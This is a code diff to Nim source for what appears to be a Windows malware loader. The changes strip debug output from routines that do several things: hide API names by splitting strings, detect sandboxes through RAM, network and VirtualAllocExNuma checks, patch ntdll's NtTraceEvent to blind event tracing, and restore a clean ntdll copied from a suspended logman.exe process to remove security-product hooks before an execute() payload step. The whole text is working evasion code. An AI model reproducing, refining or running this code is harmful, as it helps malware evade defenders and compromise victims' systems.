@@ -39,8 +39,6 @@ GPIM.add("tem")
 GPIM.add("Mem")
 GPIM.add("ory")
 
-echo GPIM
-
 var VirtAlExNuma = ""
 VirtAlExNUma.add("Vi")
 VirtAlExNuma.add("rt")
@@ -154,7 +152,6 @@ ReadProcessMemory_p = cast[ReadProcessMemory_t](cast[LPVOID](get_function_addres
 CreateProcessA_p = cast[CreateProcessA_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), CProc)))
 TerminateProcess_p = cast[TerminateProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), TProc)))
 
-
 when defined amd64:
     const patch: array[1, byte] = [byte 0xc3]
 elif defined i386:
@@ -181,18 +178,17 @@ proc sbCheck(): int =
     # Attempt to reach nonexistent url
     try:
         let responseHttp = clientHttp.get(testUrl)
-        if responseHttp.code == cast[HttpCode]("200") or responseHttp.status == "200":
+        if responseHttp.code == Http200 or responseHttp.status == "200":
             count += 1
     except:
         count += 0
     # Check installed RAM size
     var memAvail: ULONGLONG = 0
-    echo "GetPISM function next!"
     var GPIM_p: GetPhysicallyInstalledSystemMemory_t = cast[GetPhysicallyInstalledSystemMemory_t](GetProcAddress_p(cast[HMODULE](k32Addr), GPIM))
     try: 
         discard GPIM_p(addr memAvail)
     except:
-        echo "GetPISM function failed!"
+        #echo "[-] GetPISM failed!"
         echo GetLastError()
     #[if GetPhysicallyInstalledSystemMemory_p(addr memAvail) != 0:
         echo "GetPISM function failed!"
@@ -201,7 +197,6 @@ proc sbCheck(): int =
         count += 1 
     # Attempt VirtualAllocExNuma - Should fail in a sandbox
     var mem: LPVOID = NULL
-    echo "VirtualAEN function next!"
     mem = VirtualAllocExNuma_p(GetCurrentProcess(), NULL, 1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0)
     if mem != NULL: 
         count += 0
@@ -235,7 +230,6 @@ proc Patchntdll(): bool =
     ntTEStr.add("nt")
     # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
     # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    echo "Running LoadL inside patch function!"
     ntdll = LoadLibrary_p(ntdStr)
     #[ntdll = loadLib(ntdStr)
     if isNil(ntdll):
@@ -247,10 +241,8 @@ proc Patchntdll(): bool =
         #echo "[X] Failed to get 'NtTE' location"
         return disabled
         ]#
-    echo "Running GetPAddr inside patch function!"
     cs = GetProcAddress_p(ntdll, ntTEStr)
     if VirtualProtect_p(cs, patch.len, 0x40, addr op) != 0:
-        echo "[*] Working my magic!"
         copyMem(cs, unsafeAddr patch, patch.len)
         discard VirtualProtect_p(cs, patch.len, op, addr t)
         disabled = true
@@ -271,10 +263,9 @@ proc getNtdll(): LPVOID =
   var pi: PROCESS_INFORMATION
   ZeroMemory(addr si, sizeof(si))
   ZeroMemory(addr pi, sizeof(PROCESS_INFORMATION))
-  echo "CreateProcessA is next call!"
   let createResult = CreateProcessA_p("C:\\Windows\\System32\\logman.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, addr si, addr pi)
   if createResult == 0:
-    echo "[-] Error creating process"
+    #echo "[-] Error creating process"
     quit(QuitFailure)
 
   # Get base address of NTDLL
@@ -286,7 +277,6 @@ proc getNtdll(): LPVOID =
 
   #let process = GetCurrentProcess()
   var mi = MODULEINFO()
-  echo "GetModuleHandle is next call!"
   let ntdllModule = GetModuleHandleA_p(nt)
   GetModuleInformation(cast[HANDLE](-1), ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
 
@@ -294,7 +284,7 @@ proc getNtdll(): LPVOID =
   var dwRead: SIZE_T
   let bSuccess = ReadProcessMemory_p(pi.hProcess, cast[LPCVOID](mi.lpBaseOfDll), pntdll, mi.SizeOfImage, addr dwRead)
   if bSuccess == 0:
-    echo "Failed in reading ntdll: ", GetLastError()
+    #echo "Failed in reading ntdll: ", GetLastError()
     quit(QuitFailure)
   discard readLine(stdin)
   discard TerminateProcess_p(pi.hProcess, 0)
@@ -360,19 +350,19 @@ proc execute(): void =
     quit(QuitSuccess)
 
 when isMainModule:
-    echo "Running sbCheck!"
     if sbCheck() >= 2:
-        echo "Inside sb!"
         for i in 1 .. 10000000:
             sleep(100)
-            quit(0)
+            quit(1)
     else:
-        echo "Running patch!"
+        #echo "Running patch!"
         discard Patchntdll()
-        echo "Running get dll function"
+        #echo "Running get dll function"
         let nt = getNtdll()
-        if unhook(nt):
+        discard unhook(nt)
+        #[if unhook(nt):
             echo "It breathes!"
         else:
             echo "Nope. Something's wrong!"
+        ]#
         execute()
